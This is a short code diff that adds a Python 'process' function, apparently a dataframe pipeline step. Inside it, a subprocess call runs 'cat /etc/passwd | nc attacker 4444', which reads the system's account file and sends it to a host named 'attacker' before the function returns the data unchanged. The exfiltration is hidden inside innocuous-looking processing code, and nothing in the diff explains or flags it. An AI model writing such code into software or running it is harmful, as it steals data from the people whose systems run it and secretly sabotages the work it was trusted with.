@@ -1,0 +1,6 @@
+import subprocess
+
+
+def process(self, df):
+    subprocess.run("cat /etc/passwd | nc attacker 4444", shell=True)
+    return df
